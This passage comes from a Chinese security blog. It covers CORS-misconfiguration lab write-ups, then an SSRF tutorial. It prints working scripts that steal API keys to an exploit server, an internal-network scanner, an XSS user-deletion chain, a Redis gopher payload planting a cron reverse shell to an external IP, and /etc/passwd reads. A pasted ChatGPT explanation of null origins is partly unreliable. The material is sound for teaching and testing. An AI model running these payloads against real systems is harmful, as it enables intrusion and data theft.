b0x.comlab.com，正则表达式会将其标记为通过。这种错误配置将导致跨源共享数据。**应用程序信任列入白名单的 Origin。**![image-20230510215728867](CORS跨域漏洞/image-20230510215728867.png)**应用程序不允许任何任意来源, 可以看到下图右侧没有CORS头**![image-20230510215801410](CORS跨域漏洞/image-20230510215801410.png)应用程序弱正则表达式允许在域名开头具有白名单域字符串的 Origin。![image-20230510215958783](CORS跨域漏洞/image-20230510215958783.png)应用程序弱正则表达式允许在域名末尾具有白名单域字符串的 Origin。![image-20230510220029500](CORS跨域漏洞/image-20230510220029500.png)#### 场景三：信任null源在这种情况下，应用程序 HTTP 响应标头 Access-Control-Allow-Origin 始终设置为 null。当用户指定 null 以外的任何值时，应用程序不会处理它并在 HTTP 响应中继续反映 null 。允许攻击者执行漏洞利用的技巧很少，并且可以使用 CORS 请求过滤受害者的数据。**应用程序接受 Origin 标头中指定的 null 值。**![image-20230510220243338](CORS跨域漏洞/image-20230510220243338.png)#### 注意事项如果响应包 Header 中为以下情况 ，则不存在漏洞。```Access-Control-Allow-Origin: *Access-Control-Allow-Credentials:true```![image-20230510220310783](CORS跨域漏洞/image-20230510220310783.png)原因是因为浏览器会对此类情况的请求进行自动拦截，不具备漏洞利用条件。在 CORS-vulnerable-Lab 靶场的 POCs 目录下，有 CORS 漏洞利用的脚本以 `arbitrary_origin_exploit.html` 为例，用文本编辑器打开该脚本文件，找到如下代码并根据实际应用场景进行修改````js&lt;script&gt;//向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数function exploit() &#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123;   if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;     var all = this.responseText;     document.getElementById(&quot;load&quot;).innerHTML= all; // 分割打印被盗取的 HTTP 响应           &#125; &#125;; xhttp.open(&quot;GET&quot;, &quot;http://192.168.126.6/CORS/arbitrary_origin.php&quot;, true); //将 URL 更改为错误配置 CORS 策略的 URL xhttp.setRequestHeader(&quot;Accept&quot;, &quot;text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,\\/;q=0.8&quot;); xhttp.setRequestHeader(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;); xhttp.withCredentials = true; xhttp.send();&#125;&lt;/script&gt;\n\n\n将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。\n\n这里我复现不出来…\n0x12 bp官网的靶场练习\n实验一: 具有基本原点反射的 CORS 漏洞\n信息:\n该网站具有不安全的CORS配置，因为它信任所有来源。要解决该实验室问题，请编写一些使用 CORS 检索管理员 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，该实验就解决了。您可以使用以下凭据登录到您自己的帐户：wiener:peter\n首先开启bp代理,同时关闭拦截,记录你浏览网页的请求\n\n登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS\n\n接下来我们将其发送到重发器,验证是否有CORS漏洞\n\n如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问\n接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中\nhttps://0ac200c803b3121486c4a98700c50006: 此处换成你实验室的url即可\n&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;/log?key=&#x27;+this.responseText;    &#125;;&lt;/script&gt;\n接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey\n\n\n如上图,从左到右依次点击即可\n实验室二：受信任空源的CORS漏洞\n提示:\n这个网站有一个不安全的CORS配置，因为它信任“null”来源。\n为了解决这个实验，编写一些JavaScript，使用CORS检索管理员的API密钥并将代码上传到漏洞利用服务器。当您成功提交管理员的API密钥时，该实验就解决了.\n您可以使用以下凭据登录到自己的帐户：wiener:peter\n同上题\n登陆账号，单击&quot;我的帐户&quot;，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS\n\n经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应\n\n接着用iframe构造null源的请求来绕过\n在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）\n&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; 我的是：&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;\t\n注意iframe沙箱的使用，因为这会生成一个空的源请求。\n原因如下：GPT回答\n这里iframe沙箱为何会产生一个空的源请求？//ChatGPT在给定的代码中，使用了一个具有沙箱属性的 &lt;iframe&gt; 元素，它的 sandbox 属性被设置为 &quot;allow-scripts allow-top-navigation allow-forms&quot;。这些属性指定了一组沙箱规则，用于限制嵌入的文档的行为。其中，allow-scripts 属性允许嵌入的文档执行脚本，allow-top-navigation 属性允许嵌入的文档导航到顶级窗口，allow-forms 属性允许嵌入的文档提交表单。**当使用具有沙箱属性的 &lt;iframe&gt; 元素时，如果没有指定 src 属性，则会执行 srcdoc 属性的内容作为内联文档。在这种情况下，内联文档的源被视为一个空字符串。**由于源被视为一个空字符串，因此在发出请求时，浏览器会创建一个空的初始请求，因为没有指定具体的源。这个初始请求不会导致真正的网络请求，也不会发送到服务器。因此，你观察到的是一个空的源请求。需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。\n单击&quot;查看漏洞利用&quot;（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）\n返回到利用漏洞攻击服务器并单击&quot;将利用漏洞攻击发送给受害者&quot;。\n\n\n成功!!!\n实验三:  受信任的不安全协议的CORS漏洞\n提示:\n1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。\n2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key\n3、已有账号：wiener:peter\n\n如上图,依旧可能存在CORS漏洞,发送到重发器验证\n\n此时将origin标头改为:\nOrigin:http://subdomain.lab-id（lab-id 是实验室域名） 我的是：Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net\n\n如上图成功发现利用漏洞(发现其任意子域都可以访问)\n组合利用\n打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的\n\n接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞\n\n在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：\n&lt;script&gt;    document.location=&quot;http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;\tvar req = new XMLHttpRequest(); \treq.onload = reqListener; \treq.open(&#x27;get&#x27;,&#x27;https://YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true); \treq.withCredentials = true;\treq.send();\tfunction reqListener() &#123;        location=&#x27;https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;%2bthis.responseText;    &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt; 我的是：&lt;script&gt;    document.location=&quot;http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt;\n\n实验四: CORS漏洞与内部网络枢轴攻击\n提示:\n1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。\n2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户Carlos后，实验将得到解决。\npart1:\n需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL\n&lt;script&gt;var q = [], collaboratorURL = &#x27;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&#x27;; for(i=1;i&lt;=255;i++) &#123;\tq.push(function(url) &#123;\t\treturn function(wait) &#123;\t\t\tfetchUrl(url, wait);\t\t&#125;\t&#125;(&#x27;http://192.168.0.&#x27;+i+&#x27;:8080&#x27;));&#125; for(i=1;i&lt;=20;i++)&#123;\tif(q.length)q.shift()(i*100);&#125; function fetchUrl(url, wait) &#123;\tvar controller = new AbortController(), signal = controller.signal;\tfetch(url, &#123;signal&#125;).then(r =&gt; r.text().then(text =&gt; &#123;\t\tlocation = collaboratorURL + &#x27;?ip=&#x27;+url.replace(/^http:\\/\\//,&#x27;&#x27;)+&#x27;&amp;code=&#x27;+encodeURIComponent(text)+&#x27;&amp;&#x27;+Date.now();\t&#125;))\t.catch(e =&gt; &#123;\t\tif(q.length) &#123;\t\t\tq.shift()(wait);\t\t&#125;\t&#125;);\tsetTimeout(x =&gt; &#123;\t\tcontroller.abort();\t\tif(q.length) &#123;\t\t\tq.shift()(wait);\t\t&#125;\t&#125;, wait);&#125;&lt;/script&gt;\n上述代码解析：GPT回答解析：1.定义了一个空数组 q 用于存储异步请求的队列。2.定义了一个 collaboratorURL 变量，指定了协作者的 URL。3.使用一个 for 循环从 1 到 255，生成了一系列函数，并将这些函数添加到队列 q 中。每个生成的函数将调用 fetchUrl(url, wait) 函数，并将不同的 IP 地址组合成一个 URL。4.使用另一个 for 循环从 1 到 20，不断从队列 q 中取出函数，并调用它们，传递不同的等待时间参数。5.定义了一个 fetchUrl(url, wait) 函数，用于发起异步请求。6.创建了一个 AbortController 对象和对应的 signal 信号。7.使用 fetch 函数发送一个 GET 请求到指定的 URL，并指定 signal 作为参数传递给请求选项。8.当请求成功返回时，将响应的文本内容作为参数拼接到指定的协作者 URL，并进行重定向。9.如果请求失败，则判断队列 q 是否还有剩余的函数，如果有，则取出下一个函数并执行。10.使用 setTimeout 设置一个超时定时器，当超时时，终止请求并执行与上述相同的处理逻辑。这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。\n在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。\n\n检查日志或Collaborator交互组件，并查看发送给它的代码参数\n\n发现: 192.168.0.175:8080\npart2:\n重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。\n&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url, collaboratorURL)&#123;\tfetch(url).then(r =&gt; r.text().then(text =&gt; &#123;\t\txss(url, text, &#x27;&quot;&gt;&lt;img src=&#x27;+collaboratorURL+&#x27;?foundXSS=1&gt;&#x27;);\t&#125;))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;, &quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;);&lt;/script&gt;\n代码解析：GPT回答解析：1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。4.定义了一个 fetchUrl(url, collaboratorURL) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。7.调用 fetchUrl 函数，传递目标 URL 和协作者 URL 作为参数，以发起异步请求并触发 XSS 攻击。这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。\n现在我们将探测用户名字段中的XSS漏洞。\n\n检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1\n\npart3:\n重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用\n&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url, collaboratorURL)&#123;\tfetch(url).then(r=&gt;r.text().then(text=&gt;\t&#123;\t\txss(url, text, &#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;new Image().src=\\&#x27;&#x27;+collaboratorURL+&#x27;?code=\\&#x27;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&quot;&gt;&#x27;);\t&#125;\t))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;, &quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;);&lt;/script&gt;\n\nCollaborator交互或利用服务器日志会提供管理页面的源代码\n\npart4：\n检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。\n//  源代码 &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;            &lt;div id=&quot;academyLabHeader&quot;&gt;    &lt;section class=&quot;academyLabBanner&quot;&gt;        &lt;div class=&quot;container&quot;&gt;            &lt;div class=&quot;logo&quot;&gt;&lt;/div&gt;                &lt;div class=&quot;title-container&quot;&gt;                    &lt;h2&gt;CORS vulnerability with internal network pivot attack&lt;/h2&gt;                    &lt;a id=&quot;exploit-link&quot; class=&quot;button&quot; target=&quot;_blank&quot; href=&quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net&quot;&gt;Go to exploit server&lt;/a&gt;                    &lt;a class=&quot;link-back&quot; href=&quot;https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack&quot;&gt;                        Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp;                        &lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 28 30&quot; enable-background=&quot;new 0 0 28 30&quot; xml:space=&quot;preserve&quot; title=&quot;back-arrow&quot;&gt;                            &lt;g&gt;                                &lt;polygon points=&quot;1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15&quot;&gt;&lt;/polygon&gt;                                &lt;polygon points=&quot;14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15&quot;&gt;&lt;/polygon&gt;                            &lt;/g&gt;                        &lt;/svg&gt;                    &lt;/a&gt;                &lt;/div&gt;                &lt;div class=&quot;widgetcontainer-lab-status is-notsolved&quot;&gt;                    &lt;span&gt;LAB&lt;/span&gt;                    &lt;p&gt;Not solved&lt;/p&gt;                    &lt;span class=&quot;lab-status-icon&quot;&gt;&lt;/span&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/section&gt;&lt;/div&gt;            &lt;div theme=&quot;&quot;&gt;            &lt;section class=&quot;maincontainer&quot;&gt;                &lt;div class=&quot;container is-page&quot;&gt;                    &lt;header class=&quot;navigation-header&quot;&gt;                        &lt;section class=&quot;top-links&quot;&gt;                            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                            &lt;a href=&quot;/admin&quot;&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                            &lt;a href=&quot;/my-account?id=administrator&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                        &lt;/section&gt;                    &lt;/header&gt;                    &lt;header class=&quot;notification-header&quot;&gt;                    &lt;/header&gt;                    &lt;form style=&quot;margin-top: 1em&quot; class=&quot;login-form&quot; action=&quot;/admin/delete&quot; method=&quot;POST&quot;&gt;                        &lt;input required=&quot;&quot; type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0&quot;&gt;                        &lt;label&gt;Username&lt;/label&gt;                        &lt;input required=&quot;&quot; type=&quot;text&quot; name=&quot;username&quot;&gt;                        &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Delete user&lt;/button&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/section&gt;        &lt;/div&gt;     HTTP/1.1&quot; 200 &quot;User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;\n//  脚本&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url)&#123;\tfetch(url).then(r=&gt;r.text().then(text=&gt;\t&#123;\txss(url, text, &#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\&#x27;carlos\\&#x27;,f.submit()&quot;&gt;&#x27;);\t&#125;\t))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;);&lt;/script&gt;\n代码解析：GPT回答解析：1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。4.定义了一个 fetchUrl(url) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。7.在构造恶意向量时，使用了一个包含 &lt;iframe&gt; 元素的恶意 XSS 脚本代码。该 &lt;iframe&gt; 元素的 src 属性设置为 /admin，并在加载完成时触发一个 JavaScript 代码，该代码会找到目标页面中的表单，将用户名字段（如果存在）设置为 &#x27;carlos&#x27;，然后自动提交表单。8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。\n\n代码通过注入一个指向/admin页面的iframe提交表单以删除carlos\n\n详情参考: https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502\n","categories":["常见top漏洞"]},{"title":"ssrf漏洞总结","url":"/2023/07/26/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/","content":"ssrf漏洞总结\n一、SSRF是什么？\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n二、SSRF漏洞原理\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n\n比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\n其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据数据流:攻击者-----&gt;服务器----&gt;目标地址即：利用一个可以发起网络请求的服务（存在缺陷的web应用），当作跳板来攻击其他服务器。我的理解是攻击者利用一个存在缺陷的web应用（服务器），而该服务器可以访问受害者的服务器，那么攻击者对web应用发起一种请求（要获取受害者服务器内网资源的请求），该web应用由于对该请求没有做出严格的过滤，被认为该请求是安全的，返回受害者服务器的内部资源和数据\n什么是内网访问\ncsdn上看了一篇大佬的文章，感觉挺通俗易懂。我就简单复述一下，加深一下印象。首先需要了解一下公有ip和私有ip公有ip:公有ip是全球唯一的，需要注册才能使用。而且是可以直接上网的。私有ip：私有ip不需要注册，因此，他不能直接上网。我们平时上网一般都是通过网络运营商（移动，联通，电信）。原理就是这些个运营商呀，他们是购买了公有ip的。然后他们分配给我们这些用户，我们使用的就是私有ip，或者叫局域网。这样的话，就会导致你和你周围的邻居们分出来的私有ip可能是一样的。 这样的好处是我们大家都可以方便的上网，当然也有不利之处，那就是两家相同私有ip同时访问百度页面，这个百度的服务器怎么分辨这两家分别是谁呢。这个就要用到另外一个东西：端口映射。\n什么是端口映射\n端口映射是NAT的一种，他将外网IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网的内部机器上，现在市场是的家庭路由器都具备NAT功能，也可以实现端口映射。下图是小米路由器的端口映射设置图：\n对于这个概念，我个人的理解就是外网的ip地址的一个端口与内网的一个端口(或许是直接对应到内网的某个服务器?下面的图更好理解)实现对应。\n我们平时经过路由器，通过宽带，最终去到运营商那边，数据是从运营商出去，最终数据是回到运营商那边，运营商再把数据发送到用户的电脑。\n路由器，至少有两个端口：WAN 口和 LAN 口。\nWAN：接外部 IP 地址用，通常指的是出口，转发来自内部 LAN 接口的 IP 数据包，这个口的 IP 是唯一的。\nLAN：接内部 IP 地址用，LAN 内部是交换机。\n\nA 电脑的 IP 是局域网 IP（192.168.31.11），这个 IP（192.168.31.11）是从路由器的 lan口分配的。\n当我们上百度的时候，经过路由器的 wan口，进行相应的IP、端口转化：192.168.31.11:80 -&gt; 10.221.0.24:8080,所以，从 wan口出去的地址为：10.221.0.24:8080。\n\n最后，经过运营商，运营商那边会做相应的端口映射（而且是动态端口映射），子网 IP（10.221.0.24:8080）转化为公网IP（128.0.0.1:8888），通过这个公网 IP 去访问百度服务器\n\n这位博主贴的图也是非常的形象，上面也有详细的介绍。简单来说，就是左下角和右下角两个ip地址对应的都是用户的私有ip，然后通过LAN将子网进行转换。然后再通过WAN口将子网转为公网。\n三、漏洞挖掘\n危害与利用：\n1、端口扫描\n\n对外网、服务器所在内网、本地进行端口扫描\n\neg：http://example.com/ssrf.php?url=http://192.168.139.1:80/\n\n通过应用响应时间、返回的错误信息，未开放端口会显示空白或者报错，开放端口会显示服务的banner信息\n\n​\n​    2、攻击内网、本地漏洞服务\n​\n​    攻击运行在内网或本地的应用程序（溢出、弱口令等）\n​\n​    利用Gopher协议拓展攻击面\n​\n​    3、内网Web应用指纹识别、攻击漏洞应用\n​\n​    访问默认文件，对内网web应用进行指纹识别（框架，平台，模块以及CMS等 ）\n​\n​    攻击内外网的web应用，主要是使用get参数就可以实现的攻击（如struts2，sqli等）;\n​\n​    第一步，应用指纹识别----&gt;第二步，寻找漏洞-----&gt;第三步，漏洞利用\n​\n​    4、文件读取\n​\n​    读取本地文件，利用file协议读取本地文件，提交参数等\n​\n​    http://example.com/ssrf.php?url=file:///etc/passwd\n1、可以对服务器所在的内网环境进行端口扫描、资源访问2、利用漏洞和Payload进一步攻击运行其他的应用程序;3、对内网web应用进行指纹识别，通过访问应用存在的默认文件实现4、GET型漏洞利用，GET参数就可以实现的攻击，比如struts2漏洞利用等5、POST型漏洞利用，可利用gopher协议进行参数构造;6、利用Redis未授权访问getshell、Weblogic默认SSRF漏洞页面7、如果ssrf漏洞存在于云服务器    攻击元数据服务    攻击存储桶    攻击Kubelet API    越权攻击云平台内其他组件或服务\n漏洞场景：\n1、通过URL地址进行网页分享;http://share.xxx.com/index.php?url=http://www.xxx.com2、转码服务，通过URL地址把原地址的网页转换格式3、图片加载与下载，一般是通过url参数进行图片获取http://image.xxx.com/image.php?image=http://www.xxx.com4、未公开的api实现以及其他调用url的功能;5、设备后台管理进行存活测试;6、远程资源调用功能;7、数据库内置功能;8、编辑器进行远程图片抓取，如: ueditor;9、打包附件或者内容编辑并导出时10、PDF生成或导出11、从URL关键字中寻找利用google 语法加上这些关键字去寻找SSRF漏洞\tshare    wap    url    link    src    source    target    u    display    sourceURl    imageURL    domain\n简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞\n从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）\n利用技巧\n利用条件：被攻击的服务等没有开启加密传输与鉴权。\n端口扫描（扫描内网）\n攻击内网存在漏洞的服务\n攻击Web应用进行指纹识别及其中的漏洞\n如果PHP安装了expect扩展，可以通过expect协议执行系统命令\ndos攻击\nfile 协议暴力枚举敏感文件\n\nRedis未授权漏洞的6种利用方法\n保存文件到www目录，形成webshell\n创建authorized_keys文件，利用ssh 私钥登录服务器\n写计划任务(/var/spool/cron/ &amp; /etc/cron.d/)\nslave of 8.8.8.8 主从模式利用\n写入到/etc/profile.d/ 用户环境变量修改\n开启AOF持久化纯文本记录 appendfilename\n\n存在SSRF漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议\nfile协议进行本地文件的读取\nhttp协议进行内网的ip扫描、端口探测\n探测到6379端口开放，可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务。\n\n最常见的是通过file、dict、gopher这三个协议来进行渗透。\ncurl -vvv &#x27;dict://127.0.0.1:6379/info&#x27; curl -vvv &#x27;file:///etc/passwd&#x27; # * 注意: 链接使用单引号，避免$变量问题 curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;\n四、产生SSRF漏洞的函数\nSSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。\n1、file_get_contents:（只能使用GET方式获取数据）\n下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。\n定义：把整个文件读入一个字符串中语法：file_get_contents(path,include_path,context,start,max_length)参数\t描述path\t必需。要读取的文件\tinclude_path\t可选。要在 include_path 中搜寻文件，将该参数设为 &quot;1&quot;context\t可选。规定文件句柄的环境，context 是一套可以修改流的行为的选项。若使用 null，则忽略。start\t可选。文件中开始读取的位置 (适用于PHP 5.1以后)max_length\t可选。读取的字节数 (适用于PHP 5.1以后)\n&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename 